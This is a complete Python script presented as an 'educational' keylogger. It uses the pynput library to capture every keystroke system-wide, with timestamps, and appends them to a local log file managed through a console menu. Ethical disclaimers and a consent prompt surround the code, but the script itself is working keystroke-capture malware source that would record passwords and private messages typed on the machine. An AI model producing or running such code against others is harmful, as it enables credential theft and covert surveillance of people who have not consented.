#!/usr/bin/env python3
"""
Keylogger Tool
Educational keylogger for cybersecurity learning purposes.

ETHICAL DISCLAIMER:
This tool is designed EXCLUSIVELY for educational purposes and authorized security testing.
- Only use on systems you own or have explicit written permission to monitor
- Unauthorized keylogging is illegal and unethical
- This tool should never be used for malicious purposes
- Always respect privacy and follow applicable laws
"""

from pynput import keyboard
import datetime
import os
import threading
import time

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        """
        Initialize the keylogger.
        
        Args:
            log_file (str): Path to the log file
        """
        self.log_file = log_file
        self.is_logging = False
        self.listener = None
        self.log_buffer = []
        self.buffer_size = 50  # Write to file every 50 keystrokes
        
    def on_key_press(self, key):
        """
        Handle key press events.
        
        Args:
            key: The key that was pressed
        """
        if not self.is_logging:
            return
            
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        try:
            # Handle regular characters
            if hasattr(key, 'char') and key.char is not None:
                key_data = f"[{timestamp}] Key: '{key.char}'\n"
            else:
                # Handle special keys
                special_keys = {
                    keyboard.Key.space: 'SPACE',
                    keyboard.Key.enter: 'ENTER',
                    keyboard.Key.tab: 'TAB',
                    keyboard.Key.backspace: 'BACKSPACE',
                    keyboard.Key.delete: 'DELETE',
                    keyboard.Key.shift: 'SHIFT',
                    keyboard.Key.shift_r: 'RIGHT_SHIFT',
                    keyboard.Key.ctrl: 'CTRL',
                    keyboard.Key.ctrl_r: 'RIGHT_CTRL',
                    keyboard.Key.alt: 'ALT',
                    keyboard.Key.alt_r: 'RIGHT_ALT',
                    keyboard.Key.caps_lock: 'CAPS_LOCK',
                    keyboard.Key.esc: 'ESCAPE',
                    keyboard.Key.up: 'ARROW_UP',
                    keyboard.Key.down: 'ARROW_DOWN',
                    keyboard.Key.left: 'ARROW_LEFT',
                    keyboard.Key.right: 'ARROW_RIGHT',
                    keyboard.Key.home: 'HOME',
                    keyboard.Key.end: 'END',
                    keyboard.Key.page_up: 'PAGE_UP',
                    keyboard.Key.page_down: 'PAGE_DOWN',
                }
                
                key_name = special_keys.get(key, str(key).replace('Key.', '').upper())
                key_data = f"[{timestamp}] Special Key: {key_name}\n"
            
            # Add to buffer
            self.log_buffer.append(key_data)
            
            # Write to file when buffer is full
            if len(self.log_buffer) >= self.buffer_size:
                self.flush_buffer()
                
        except Exception as e:
            error_msg = f"[{timestamp}] Error logging key: {e}\n"
            self.log_buffer.append(error_msg)
    
    def flush_buffer(self):
        """Write buffered keystrokes to file."""
        if self.log_buffer:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.writelines(self.log_buffer)
                self.log_buffer.clear()
            except Exception as e:
                print(f"Error writing to log file: {e}")
    
    def start_logging(self):
        """Start the keylogger."""
        if self.is_logging:
            print("Keylogger is already running!")
            return
        
        print("=" * 50)
        print("ETHICAL DISCLAIMER:")
        print("This keylogger is for educational purposes only.")
        print("Only use on systems you own or have permission to monitor.")
        print("Unauthorized keylogging is illegal!")
        print("=" * 50)
        
        confirm = input("Do you understand and agree? (yes/no): ").lower().strip()
        if confirm != 'yes':
            print("Keylogger not started. Ethical agreement required.")
            return
        
        self.is_logging = True
        
        # Create log file with header
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        header = f"\n{'='*60}\n"
        header += f"KEYLOGGER SESSION STARTED: {timestamp}\n"
        header += f"Log File: {self.log_file}\n"
        header += f"{'='*60}\n\n"
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(header)
        except Exception as e:
            print(f"Error creating log file: {e}")
            return
        
        # Start listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()
        
        print(f"Keylogger started! Logging to: {self.log_file}")
        print("Press Ctrl+C to stop logging")
        print("Note: Some special keys may be displayed differently")
    
    def stop_logging(self):
        """Stop the keylogger."""
        if not self.is_logging:
            print("Keylogger is not running!")
            return
        
        self.is_logging = False
        
        if self.listener:
            self.listener.stop()
        
        # Flush remaining buffer
        self.flush_buffer()
        
        # Add session end marker
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        end_marker = f"\n{'='*60}\n"
        end_marker += f"KEYLOGGER SESSION ENDED: {timestamp}\n"
        end_marker += f"{'='*60}\n\n"
        
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(end_marker)
        except Exception as e:
            print(f"Error writing end marker: {e}")
        
        print("Keylogger stopped!")
    
    def view_logs(self, lines=50):
        """
        View recent log entries.
        
        Args:
            lines (int): Number of recent lines to display
        """
        if not os.path.exists(self.log_file):
            print("No log file found!")
            return
        
        try:
            with open(self.log_file, 'r', encoding='utf-8') as f:
                all_lines = f.readlines()
            
            if not all_lines:
                print("Log file is empty!")
                return
            
            print(f"\n--- Last {min(lines, len(all_lines))} log entries ---")
            for line in all_lines[-lines:]:
                print(line.strip())
                
        except Exception as e:
            print(f"Error reading log file: {e}")
    
    def clear_logs(self):
        """Clear the log file."""
        confirm = input("Are you sure you want to clear all logs? (yes/no): ").lower().strip()
        if confirm == 'yes':
            try:
                with open(self.log_file, 'w', encoding='utf-8') as f:
                    f.write("")
                print("Log file cleared!")
            except Exception as e:
                print(f"Error clearing log file: {e}")
        else:
            print("Log clearing cancelled.")

def main():
    """Main function to run the keylogger tool."""
    print("=" * 60)
    print("           EDUCATIONAL KEYLOGGER TOOL")
    print("=" * 60)
    print("WARNING: This tool is for educational purposes only!")
    print("Only use on systems you own or have explicit permission to monitor.")
    print("Unauthorized keylogging is illegal and unethical.")
    print("=" * 60)
    
    keylogger = Keylogger()
    
    while True:
        print("\nChoose an option:")
        print("1. Start keylogger")
        print("2. Stop keylogger")
        print("3. View recent logs")
        print("4. Clear logs")
        print("5. Change log file")
        print("6. Exit")
        
        choice = input("\nEnter your choice (1-6): ").strip()
        
        if choice == '1':
            try:
                keylogger.start_logging()
                # Keep the program running while logging
                while keylogger.is_logging:
                    time.sleep(1)
            except KeyboardInterrupt:
                keylogger.stop_logging()
        
        elif choice == '2':
            keylogger.stop_logging()
        
        elif choice == '3':
            try:
                lines = int(input("Number of recent lines to view (default 50): ") or "50")
                keylogger.view_logs(lines)
            except ValueError:
                print("Invalid number! Using default (50 lines)")
                keylogger.view_logs()
        
        elif choice == '4':
            keylogger.clear_logs()
        
        elif choice == '5':
            new_file = input("Enter new log file path: ").strip()
            if new_file:
                keylogger.log_file = new_file
                print(f"Log file changed to: {new_file}")
        
        elif choice == '6':
            if keylogger.is_logging:
                keylogger.stop_logging()
            print("Thank you for using Educational Keylogger Tool!")
            print("Remember: Use technology ethically and responsibly!")
            break
        
        else:
            print("Invalid choice! Please enter 1, 2, 3, 4, 5, or 6.")

if __name__ == "__main__":
    main()
